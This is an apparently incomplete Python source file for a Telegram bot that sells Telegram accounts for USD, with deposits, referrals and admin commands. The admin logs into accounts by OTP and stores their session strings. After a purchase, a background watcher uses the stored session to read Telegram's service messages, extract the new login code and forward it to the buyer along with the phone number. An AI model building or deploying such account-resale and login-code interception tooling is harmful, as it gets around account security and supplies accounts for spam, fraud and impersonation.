import os
import logging
import traceback
import psycopg
from psycopg.rows import dict_row
from dotenv import load_dotenv
load_dotenv()

from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

flask_app = Flask(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN        = os.getenv("BOT_TOKEN")
ADMIN_ID         = int(os.getenv("ADMIN_ID", "0"))
SUPPORT_USERNAME = os.getenv("SUPPORT_USERNAME", "support")
DATABASE_URL     = os.getenv("DATABASE_URL", "")
WEBHOOK_URL      = os.getenv("WEBHOOK_URL", "")
PORT             = int(os.getenv("PORT", "8080"))
API_ID           = int(os.getenv("API_ID", "0"))
API_HASH         = os.getenv("API_HASH", "")
REFERRAL_COMMISSION = 0.02

ptb_app: Application = None

(DEPOSIT_AMOUNT, ADMIN_PHONE, ADMIN_OTP, ADMIN_ADD_PRICE,
 SELL_PHONE, SELL_OTP, SELL_PRICE) = range(7)

# ── Database ──────────────────────────────────────────────────────────────────
def get_db():
    return psycopg.connect(DATABASE_URL, row_factory=dict_row)

def init_db():
    with get_db() as conn:
        conn.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id BIGINT PRIMARY KEY, username TEXT DEFAULT '',
            balance NUMERIC(12,2) DEFAULT 0, referred_by BIGINT DEFAULT NULL,
            created_at TIMESTAMPTZ DEFAULT NOW())""")
        conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS referred_by BIGINT DEFAULT NULL")
        conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS username TEXT DEFAULT ''")
        conn.execute("""CREATE TABLE IF NOT EXISTS deposits (
            id BIGSERIAL PRIMARY KEY, user_id BIGINT, amount NUMERIC(12,2),
            status TEXT DEFAULT 'pending', created_at TIMESTAMPTZ DEFAULT NOW())""")
        conn.execute("""CREATE TABLE IF NOT EXISTS accounts (
            id BIGSERIAL PRIMARY KEY, session TEXT, phone TEXT DEFAULT '',
            price NUMERIC(12,2),
            status TEXT DEFAULT 'available', buyer_id BIGINT DEFAULT NULL,
            created_at TIMESTAMPTZ DEFAULT NOW())""")
        conn.execute("ALTER TABLE accounts ADD COLUMN IF NOT EXISTS phone TEXT DEFAULT ''")
        conn.execute("""CREATE TABLE IF NOT EXISTS referral_earnings (
            id BIGSERIAL PRIMARY KEY, referrer_id BIGINT, referred_id BIGINT,
            deposit_id BIGINT, commission NUMERIC(12,2),
            created_at TIMESTAMPTZ DEFAULT NOW())""")
        conn.execute("""CREATE TABLE IF NOT EXISTS country_prices (
            country_code TEXT PRIMARY KEY,
            country_name TEXT NOT NULL,
            dial_code    TEXT NOT NULL DEFAULT '',
            price        NUMERIC(12,2) NOT NULL,
            updated_at   TIMESTAMPTZ DEFAULT NOW())""")
        conn.execute("ALTER TABLE country_prices ADD COLUMN IF NOT EXISTS dial_code TEXT NOT NULL DEFAULT ''")
    logger.info("✅ Database initialised.")

# ── Helpers ───────────────────────────────────────────────────────────────────
def ensure_user(user_id: int, username: str = "", referred_by: int = None):
    with get_db() as conn:
        if not conn.execute("SELECT 1 FROM users WHERE user_id=%s", (user_id,)).fetchone():
            conn.execute(
                "INSERT INTO users (user_id, username, referred_by) VALUES (%s,%s,%s)",
                (user_id, username or "", referred_by)
            )

def get_balance(user_id: int) -> float:
    with get_db() as conn:
        row = conn.execute("SELECT balance FROM users WHERE user_id=%s", (user_id,)).fetchone()
        return float(row["balance"]) if row else 0.0

def get_referral_count(user_id: int) -> int:
    with get_db() as conn:
        row = conn.execute("SELECT COUNT(*) AS cnt FROM users WHERE referred_by=%s", (user_id,)).fetchone()
        return row["cnt"] if row else 0

def get_referral_earnings(user_id: int) -> float:
    with get_db() as conn:
        row = conn.execute(
            "SELECT COALESCE(SUM(commission),0) AS total FROM referral_earnings WHERE referrer_id=%s",
            (user_id,)
        ).fetchone()
        return float(row["total"]) if row else 0.0

# ── Premium emoji helpers ──────────────────────────────────────────────────────
def pe(emoji_id: str, fallback: str) -> str:
    """Wrap a premium emoji ID for use in HTML parse_mode messages."""
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

# Premium emoji IDs
PE_BUY      = "6298691319086712919"
PE_SELL     = "6298356878573307709"
PE_RECHARGE = "6255738287462288807"
PE_WITHDRAW = "6129731974291527294"
PE_WALLET   = "6129801569941592173"
PE_REFER    = "6129700535130922338"
PE_SUPPORT  = "6296577138615125756"

# ── Keyboards ─────────────────────────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛒 Buy Account",   callback_data="menu_buy"),
         InlineKeyboardButton("💰 Sell Account",  callback_data="menu_sell")],
        [InlineKeyboardButton("💵 Recharge",      callback_data="menu_deposit"),
         InlineKeyboardButton("💸 Withdraw",      callback_data="menu_withdraw")],
        [InlineKeyboardButton("📊 My Wallet",     callback_data="menu_balance"),
         InlineKeyboardButton("👥 Refer & Earn",  callback_data="menu_refer")],
        [InlineKeyboardButton("🆘 Support",       url=f"https://t.me/{SUPPORT_USERNAME}")],
    ])

def back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]])


# ── PTB error handler (logs ALL handler exceptions to console) ────────────────
async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling update:", exc_info=ctx.error)
    logger.error(traceback.format_exc())
    # Try to notify the user something went wrong
    try:
        if isinstance(update, Update) and update.effective_message:
            await update.effective_message.reply_text(
                "⚠️ Something went wrong. Please try again or contact support."
            )
    except Exception:
        pass


# ── /start ────────────────────────────────────────────────────────────────────
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logger.info(f"/start from user_id={user.id} username={user.username}")
    referred_by = None
    if ctx.args and ctx.args[0].startswith("ref_"):
        try:
            ref_id = int(ctx.args[0].split("_")[1])
            if ref_id != user.id:
                referred_by = ref_id
        except (IndexError, ValueError):
            pass
    try:
        ensure_user(user.id, user.username or "", referred_by)
    except Exception as e:
        logger.error(f"ensure_user failed: {e}\n{traceback.format_exc()}")
    if referred_by:
        try:
            await ctx.bot.send_message(referred_by,
                f"🎉 *New Referral!*\n\n@{user.username or user.first_name} just joined!\n"
                f"You'll earn *{int(REFERRAL_COMMISSION*100)}%* on their deposits.",
                parse_mode="Markdown")
        except Exception:
            pass
    await update.message.reply_text(
        f"╔══════════════════════╗\n      🏪 <b>TG MARKET</b>\n╚══════════════════════╝\n\n"
        f"👋 Welcome, <b>{user.first_name}</b>!\n\n"
        f"The #1 marketplace to buy Telegram accounts safely using USD.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n💡 <b>How it works:</b>\n"
        f"  {pe(PE_RECHARGE,'💵')} Recharge USD to your wallet\n"
        f"  {pe(PE_BUY,'🛒')} Browse &amp; buy Telegram accounts\n"
        f"  {pe(PE_WALLET,'📊')} Receive session instantly after purchase\n"
        f"  {pe(PE_REFER,'👥')} Refer friends &amp; earn 2% commission\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\nChoose an option below 👇",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def menu_back(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"🏪 <b>TG MARKET</b> — Main Menu\n\n"
        f"{pe(PE_WALLET,'�')} Balance: <b>${get_balance(query.from_user.id):.2f}</b>\n\n"
        f"What would you like to do?\n\n"
        f"{pe(PE_BUY,'🛒')} Buy Account   {pe(PE_SELL,'💰')} Sell Account\n"
        f"{pe(PE_RECHARGE,'💵')} Recharge   {pe(PE_WITHDRAW,'💸')} Withdraw\n"
        f"{pe(PE_WALLET,'📊')} My Wallet   {pe(PE_REFER,'👥')} Refer &amp; Earn\n"
        f"{pe(PE_SUPPORT,'🆘')} Support",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Action cancelled.", reply_markup=main_menu_keyboard())
    return ConversationHandler.END

# ── DEPOSIT ───────────────────────────────────────────────────────────────────
async def deposit_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"╔══════════════════════╗\n      {pe(PE_RECHARGE,'💵')} <b>RECHARGE</b>\n╚══════════════════════╝\n\n"
        "Send the amount you wish to recharge.\n\n📌 <b>Example:</b> <code>50</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\nAfter submitting, the admin will verify\n"
        "your payment and credit your balance.\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "✏️ Enter amount or /cancel to go back:",
        parse_mode="HTML")
    return DEPOSIT_AMOUNT

async def deposit_amount(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ensure_user(user.id, user.username or "")
    try:
        amount = float(update.message.text.strip())
        if amount <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ *Invalid amount.* Enter a positive number like `25`.", parse_mode="Markdown")
        return DEPOSIT_AMOUNT
    with get_db() as conn:
        dep_id = conn.execute(
            "INSERT INTO deposits (user_id, amount) VALUES (%s,%s) RETURNING id",
            (user.id, amount)).fetchone()["id"]
    await ctx.bot.send_message(ADMIN_ID,
        f"📥 *NEW DEPOSIT REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: @{user.username or user.first_name} (`{user.id}`)\n"
        f"💵 Amount: *${amount:.2f}*\n🆔 Deposit ID: `{dep_id}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n✅ /approve_{dep_id}\n❌ /reject_{dep_id}\n"
        f"💳 /credit {user.id} {amount:.2f}", parse_mode="Markdown")
    await update.message.reply_text(
        f"✅ *Deposit Request Submitted!*\n\n💵 Amount: *${amount:.2f}*\n🆔 Reference ID: `{dep_id}`\n\n"
        f"⏳ Admin will verify and credit your balance shortly.",
        parse_mode="Markdown", reply_markup=main_menu_keyboard())
    return ConversationHandler.END

async def admin_approve(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        dep_id = int(update.message.text.split("_")[1])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /approve_<id>"); return
    with get_db() as conn:
        dep = conn.execute("SELECT * FROM deposits WHERE id=%s", (dep_id,)).fetchone()
        if not dep:
            await update.message.reply_text("❌ Not found."); return
        if dep["status"] != "pending":
            await update.message.reply_text("⚠️ Already processed."); return
        conn.execute("UPDATE deposits SET status='approved' WHERE id=%s", (dep_id,))
        conn.execute("UPDATE users SET balance=balance+%s WHERE user_id=%s", (dep["amount"], dep["user_id"]))
        referrer = conn.execute("SELECT referred_by FROM users WHERE user_id=%s", (dep["user_id"],)).fetchone()
        commission = 0.0
        if referrer and referrer["referred_by"]:
            commission = float(dep["amount"]) * REFERRAL_COMMISSION
            conn.execute("UPDATE users SET balance=balance+%s WHERE user_id=%s", (commission, referrer["referred_by"]))
            conn.execute("INSERT INTO referral_earnings (referrer_id,referred_id,deposit_id,commission) VALUES (%s,%s,%s,%s)",
                (referrer["referred_by"], dep["user_id"], dep_id, commission))
    await update.message.reply_text(
        f"✅ Deposit #{dep_id} approved! *${dep['amount']:.2f}* credited."
        + (f"\n🤝 Referral *${commission:.2f}* paid." if commission else ""), parse_mode="Markdown")
    await ctx.bot.send_message(dep["user_id"],
        f"🎉 *Deposit Approved!*\n\n💵 *${dep['amount']:.2f}* added to your wallet.\n🆔 Ref: `{dep_id}`\n\nStart shopping! 🛒",
        parse_mode="Markdown", reply_markup=main_menu_keyboard())
    if referrer and referrer["referred_by"] and commission > 0:
        try:
            await ctx.bot.send_message(referrer["referred_by"],
                f"💰 *Referral Commission!*\nYou earned *${commission:.2f}*!", parse_mode="Markdown")
        except Exception:
            pass

async def admin_reject(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        dep_id = int(update.message.text.split("_")[1])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /reject_<id>"); return
    with get_db() as conn:
        dep = conn.execute("SELECT * FROM deposits WHERE id=%s", (dep_id,)).fetchone()
        if not dep or dep["status"] != "pending":
            await update.message.reply_text("❌ Not found or already processed."); return
        conn.execute("UPDATE deposits SET status='rejected' WHERE id=%s", (dep_id,))
    await update.message.reply_text(f"❌ Deposit #{dep_id} rejected.")
    await ctx.bot.send_message(dep["user_id"],
        f"❌ *Deposit Rejected*\n\nYour deposit of *${dep['amount']:.2f}* (ID: `{dep_id}`) was not approved.\nContact 🆘 Support if this is an error.",
        parse_mode="Markdown", reply_markup=main_menu_keyboard())

# ── Admin: credit / deduct ────────────────────────────────────────────────────
async def admin_credit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        parts = update.message.text.strip().split()
        user_id = int(parts[1])
        amount  = float(parts[2])
        if amount <= 0:
            raise ValueError
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: `/credit <user_id> <amount>`\nExample: `/credit 123456789 50`", parse_mode="Markdown")
        return
    ensure_user(user_id, "")
    with get_db() as conn:
        conn.execute("UPDATE users SET balance=balance+%s WHERE user_id=%s", (amount, user_id))
        new_bal = float(conn.execute("SELECT balance FROM users WHERE user_id=%s", (user_id,)).fetchone()["balance"])
    await update.message.reply_text(f"✅ *${amount:.2f} credited to `{user_id}`*\nNew balance: *${new_bal:.2f}*", parse_mode="Markdown")
    try:
        await ctx.bot.send_message(user_id,
            f"🎉 *${amount:.2f} added to your balance by admin!*\n\nNew balance: *${new_bal:.2f}*\n\nStart shopping! 🛒",
            parse_mode="Markdown", reply_markup=main_menu_keyboard())
    except Exception:
        await update.message.reply_text("⚠️ Credited but could not notify user.")

async def admin_deduct(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        parts = update.message.text.strip().split()
        user_id = int(parts[1])
        amount  = float(parts[2])
        if amount <= 0:
            raise ValueError
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: `/deduct <user_id> <amount>`", parse_mode="Markdown")
        return
    with get_db() as conn:
        bal = conn.execute("SELECT balance FROM users WHERE user_id=%s", (user_id,)).fetchone()
        if not bal or float(bal["balance"]) < amount:
            await update.message.reply_text("❌ User not found or insufficient balance."); return
        conn.execute("UPDATE users SET balance=balance-%s WHERE user_id=%s", (amount, user_id))
        new_bal = float(conn.execute("SELECT balance FROM users WHERE user_id=%s", (user_id,)).fetchone()["balance"])
    await update.message.reply_text(f"✅ *${amount:.2f} deducted from `{user_id}`*\nNew balance: *${new_bal:.2f}*", parse_mode="Markdown")


# ── Admin: login via OTP ──────────────────────────────────────────────────────
async def admin_login(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Not authorised.")
        return ConversationHandler.END
    await update.message.reply_text(
        "╔══════════════════════╗\n    📱 *LOGIN ACCOUNT*\n╚══════════════════════╝\n\n"
        "Send the phone number with country code.\n\n📌 Example: `+12345678900`\n\n/cancel to abort.",
        parse_mode="Markdown")
    return ADMIN_PHONE

async def get_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    ctx.user_data["phone"] = phone
    await update.message.reply_text("⏳ Sending OTP...")
    if not API_ID or not API_HASH:
        await update.message.reply_text(
            "❌ *Configuration Error*\n\n`API_ID` or `API_HASH` not set in Render env vars.",
            parse_mode="Markdown")
        return ConversationHandler.END
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        ctx.user_data["client"] = client
        ctx.user_data["phone_code_hash"] = result.phone_code_hash
        await update.message.reply_text(
            "📩 *OTP sent!*\n\nEnter the OTP you received _(digits only, e.g. `12345`)_:",
            parse_mode="Markdown")
        return ADMIN_OTP
    except Exception as e:
        logger.error(f"OTP error: {traceback.format_exc()}")
        await update.message.reply_text(
            f"❌ *Failed to send OTP*\n\n`{type(e).__name__}: {e}`\n\n"
            f"• API\\_ID set: `{'Yes' if API_ID else 'No'}`\n"
            f"• API\\_HASH set: `{'Yes' if API_HASH else 'No'}`",
            parse_mode="Markdown")
        return ConversationHandler.END

async def get_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    otp       = update.message.text.strip().replace(" ", "")
    client    = ctx.user_data.get("client")
    phone     = ctx.user_data.get("phone")
    code_hash = ctx.user_data.get("phone_code_hash")
    if not client:
        await update.message.reply_text("❌ Session expired. Run /login_account again.")
        return ConversationHandler.END
    try:
        from telethon.sessions import StringSession
        await client.sign_in(phone, otp, phone_code_hash=code_hash)
        session_string = client.session.save()
        await client.disconnect()
        ctx.user_data["session"] = session_string
        await update.message.reply_text(
            "✅ *Login successful!*\n\n💵 Now enter the price for this account (e.g. `25`):",
            parse_mode="Markdown")
        return ADMIN_ADD_PRICE
    except Exception as e:
        await update.message.reply_text(f"❌ *Login failed*\n\n`{e}`\n\nRun /login\\_account to try again.", parse_mode="Markdown")
        return ConversationHandler.END

async def set_price(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        price = float(update.message.text.strip())
        if price <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Enter a valid positive price.")
        return ADMIN_ADD_PRICE
    with get_db() as conn:
        acc_id = conn.execute(
            "INSERT INTO accounts (session, phone, price) VALUES (%s,%s,%s) RETURNING id",
            (ctx.user_data["session"], ctx.user_data.get("phone", ""), price)
        ).fetchone()["id"]
    await update.message.reply_text(
        f"🎉 *Account #{acc_id} Added!*\n\n💵 Price: *${price:.2f}*\n🟢 Now visible in the marketplace.",
        parse_mode="Markdown")
    return ConversationHandler.END

# ── Admin: view commands ──────────────────────────────────────────────────────
async def admin_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    with get_db() as conn:
        rows = conn.execute("SELECT id, price, status, buyer_id FROM accounts ORDER BY id DESC").fetchall()
    if not rows:
        await update.message.reply_text("📦 No accounts yet."); return
    icons = {"available": "🟢", "sold": "✅", "pending_review": "🔄"}
    lines = [f"📦 *All Accounts* ({len(rows)})\n━━━━━━━━━━━━━━━━━━━━━━"]
    for r in rows:
        lines.append(f"{icons.get(r['status'],'⚪')} #{r['id']} — *${r['price']:.2f}* ({r['status']})"
            + (f" → `{r['buyer_id']}`" if r["buyer_id"] else ""))
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def admin_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    with get_db() as conn:
        users = conn.execute("SELECT * FROM users ORDER BY created_at DESC").fetchall()
    lines = [f"👥 *All Users* ({len(users)})\n━━━━━━━━━━━━━━━━━━━━━━"]
    for u in users:
        lines.append(f"• @{u['username'] or 'N/A'} (`{u['user_id']}`) — *${u['balance']:.2f}*")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def admin_pending(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    with get_db() as conn:
        deps = conn.execute(
            "SELECT d.*, u.username FROM deposits d JOIN users u ON d.user_id=u.user_id WHERE d.status='pending'"
        ).fetchall()
    if not deps:
        await update.message.reply_text("✅ No pending deposits."); return
    lines = [f"📥 *Pending Deposits* ({len(deps)})\n━━━━━━━━━━━━━━━━━━━━━━"]
    for d in deps:
        lines.append(f"🆔 `{d['id']}` — @{d['username'] or d['user_id']} — *${d['amount']:.2f}*\n"
            f"   ✅ /approve_{d['id']}   ❌ /reject_{d['id']}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def admin_delete(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        acc_id = int(update.message.text.split("_")[1])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /del_<id>"); return
    with get_db() as conn:
        conn.execute("DELETE FROM accounts WHERE id=%s", (acc_id,))
    await update.message.reply_text(f"🗑 Account #{acc_id} deleted.")

async def admin_add_sell(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Admin sets price for a pending_review account submitted by a seller.
    Usage: /add_sell <account_id> <price>
    The account_id is shown in the notification sent when user submits.
    """
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        parts = update.message.text.strip().split()
        acc_id = int(parts[1])
        price  = float(parts[2])
        if price <= 0:
            raise ValueError
    except (IndexError, ValueError):
        await update.message.reply_text(
            "Usage: <code>/add_sell &lt;account_id&gt; &lt;price&gt;</code>\n"
            "Example: <code>/add_sell 5 25.00</code>",
            parse_mode="HTML")
        return
    with get_db() as conn:
        acc = conn.execute(
            "SELECT * FROM accounts WHERE id=%s AND status='pending_review'", (acc_id,)
        ).fetchone()
        if not acc:
            await update.message.reply_text(
                f"❌ Account #{acc_id} not found or not pending review."); return
        conn.execute(
            "UPDATE accounts SET price=%s, status='available' WHERE id=%s",
            (price, acc_id)
        )
    await update.message.reply_text(
        f"✅ Account #{acc_id} listed at <b>${price:.2f}</b> — now visible in marketplace.",
        parse_mode="HTML"
    )

# ── OTP background watcher ────────────────────────────────────────────────────
async def _watch_for_otp(bot, user_id: int, session_str: str, phone: str, acc_id: int):
    """
    Runs in the background after a purchase.
    Connects with the sold account's session, waits for a new message from
    Telegram's service account (777000), extracts the OTP, and forwards it
    to the buyer. Does NOT trigger the OTP itself — the user does that by
    entering the phone number on their own device.
    """
    import re
    import asyncio
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.tl.functions.messages import GetHistoryRequest

    try:
        session_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await session_client.connect()

        # Snapshot the latest message ID from 777000 right now (before OTP arrives)
        baseline_id = 0
        service_peer = None
        try:
            service_peer = await session_client.get_input_entity(777000)
            history = await session_client(GetHistoryRequest(
                peer=service_peer,
                limit=1,
                offset_date=None, offset_id=0,
                max_id=0, min_id=0, add_offset=0, hash=0
            ))
            if history.messages:
                baseline_id = history.messages[0].id
        except Exception as e:
            logger.warning(f"[OTP watcher #{acc_id}] baseline error: {e}")

        # Poll every 4 seconds for up to 5 minutes
        otp_code = None
        deadline = asyncio.get_event_loop().time() + 300

        while asyncio.get_event_loop().time() < deadline:
            await asyncio.sleep(4)
            try:
                history = await session_client(GetHistoryRequest(
                    peer=service_peer,
                    limit=5,
                    offset_date=None, offset_id=0,
                    max_id=0, min_id=0, add_offset=0, hash=0
                ))
                for msg in history.messages:
                    if msg.id <= baseline_id:
                        continue  # skip old messages
                    text = getattr(msg, "message", "") or ""
                    match = re.search(r'\b(\d{5,6})\b', text)
                    if match:
                        otp_code = match.group(1)
                        break
            except Exception as e:
                logger.warning(f"[OTP watcher #{acc_id}] poll error: {e}")
            if otp_code:
                break

        await session_client.disconnect()

        if otp_code:
            await bot.send_message(
                user_id,
                f"🔐 *Your OTP has arrived!*\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 Phone: `{phone}`\n"
                f"🔑 OTP Code: `{otp_code}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⚠️ Enter this code in Telegram now.\n"
                f"⚠️ OTP expires in a few minutes.\n"
                f"⚠️ Do *not* share these details.",
                parse_mode="Markdown"
            )
        else:
            await bot.send_message(
                user_id,
                f"⏰ *OTP not detected automatically.*\n\n"
                f"Telegram may have sent the code via SMS instead.\n\n"
                f"📱 Phone: `{phone}`\n\n"
                f"Please check your SMS or contact support.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🆘 Support", url=f"https://t.me/{SUPPORT_USERNAME}")]
                ])
            )

    except Exception as e:
        logger.error(f"[OTP watcher #{acc_id}] fatal: {e}\n{traceback.format_exc()}")
        await bot.send_message(
            user_id,
            f"⚠️ *OTP auto-detection failed.*\n\n"
            f"📱 Phone: `{phone}`\n\n"
            f"Please request the OTP manually and contact support if needed.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🆘 Support", url=f"https://t.me/{SUPPORT_USERNAME}")]
            ])
        )


# ── BUY FLOW ──────────────────────────────────────────────────────────────────
async def buy_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    with get_db() as conn:
        accounts = conn.execute("SELECT id, price FROM accounts WHERE status='available' ORDER BY price ASC").fetchall()
    if not accounts:
        await query.edit_message_text(
            "╔══════════════════════╗\n     🛒 *MARKETPLACE*\n╚══════════════════════╝\n\n"
            "😔 No accounts available right now.\nCheck back soon!",
            parse_mode="Markdown", reply_markup=back_keyboard()); return
    buttons = [[InlineKeyboardButton(f"🔑 Account #{a['id']}  —  ${a['price']:.2f}", callback_data=f"view_{a['id']}")] for a in accounts]
    buttons.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")])
    await query.edit_message_text(
        f"╔══════════════════════╗\n     🛒 *MARKETPLACE*\n╚══════════════════════╝\n\n"
        f"📦 *{len(accounts)} account(s) available*\n\nTap any listing to view details:",
        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(buttons))

async def view_account(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    acc_id  = int(query.data.split("_")[1])
    user_id = query.from_user.id
    ensure_user(user_id, query.from_user.username or "")
    with get_db() as conn:
        acc = conn.execute("SELECT id, price FROM accounts WHERE id=%s AND status='available'", (acc_id,)).fetchone()
    if not acc:
        await query.edit_message_text("❌ No longer available.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛒 Browse Others", callback_data="menu_buy")]])); return
    balance = get_balance(user_id)
    has_funds = balance >= float(acc["price"])
    await query.edit_message_text(
        f"╔══════════════════════╗\n    🔑 *ACCOUNT DETAILS*\n╚══════════════════════╝\n\n"
        f"🆔 Account ID:  *#{acc['id']}*\n💵 Price:       *${acc['price']:.2f}*\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n💼 Your Balance: *${balance:.2f}*\n"
        f"{'✅ You have enough funds.' if has_funds else '❌ Insufficient balance — deposit first.'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Buy Now", callback_data=f"confirm_{acc_id}")],
            [InlineKeyboardButton("🔙 Back",    callback_data="menu_buy")]]))

async def confirm_buy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    acc_id  = int(query.data.split("_")[1])
    user_id = query.from_user.id
    ensure_user(user_id, query.from_user.username or "")

    with get_db() as conn:
        acc = conn.execute(
            "SELECT * FROM accounts WHERE id=%s AND status='available'", (acc_id,)
        ).fetchone()
        if not acc:
            await query.edit_message_text("❌ Account no longer available."); return

        balance = get_balance(user_id)
        if balance < float(acc["price"]):
            await query.edit_message_text(
                f"❌ *Insufficient Balance*\n\n"
                f"💼 Your balance: *${balance:.2f}*\n"
                f"💵 Required:     *${acc['price']:.2f}*",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💰 Deposit Now", callback_data="menu_deposit")],
                    [InlineKeyboardButton("🔙 Back",        callback_data="menu_back")]
                ])
            )
            return

        # Deduct balance and mark sold
        conn.execute(
            "UPDATE users SET balance=balance-%s WHERE user_id=%s", (acc["price"], user_id)
        )
        conn.execute(
            "UPDATE accounts SET status='sold', buyer_id=%s WHERE id=%s", (user_id, acc_id)
        )

    await query.edit_message_text(
        f"🎉 *Purchase Successful!*\n\n"
        f"🔑 Account *#{acc_id}* is yours!\n"
        f"💵 Paid: *${acc['price']:.2f}*\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Sending login details...\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard()
    )

    phone = acc.get("phone", "").strip()

    # ── Send phone number to buyer immediately ────────────────────────────────
    await ctx.bot.send_message(
        user_id,
        f"📱 *Your Account Phone Number:*\n\n"
        f"`{phone}`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"*How to login:*\n"
        f"1️⃣ Open Telegram on any device\n"
        f"2️⃣ Enter the phone number above\n"
        f"3️⃣ Telegram will send an OTP to this account\n"
        f"4️⃣ I will automatically forward the OTP to you here ⬇️\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ *Waiting for OTP... (up to 5 minutes)*",
        parse_mode="Markdown"
    )

    # ── Launch OTP watcher as a background task on the shared event loop ─────
    # Must NOT await — the webhook has no timeout now but we still want this
    # running independently so it doesn't block other updates.
    # Use the same loop the webhook runs on (stored in flask_app.config).
    import asyncio
    bg_loop = flask_app.config.get("ASYNCIO_LOOP")
    if bg_loop:
        asyncio.run_coroutine_threadsafe(
            _watch_for_otp(ctx.bot, user_id, acc["session"], phone, acc_id),
            bg_loop
        )
    else:
        # Fallback: schedule on current loop
        asyncio.get_event_loop().create_task(
            _watch_for_otp(ctx.bot, user_id, acc["session"], phone, acc_id)
        )

    # Notify admin
    await ctx.bot.send_message(
        ADMIN_ID,
        f"💸 *Account Sold*\n\n"
        f"🔑 Account *#{acc_id}* sold to `{user_id}` for *${acc['price']:.2f}*.\n"
        f"📱 Phone: `{phone}`",
        parse_mode="Markdown"
    )


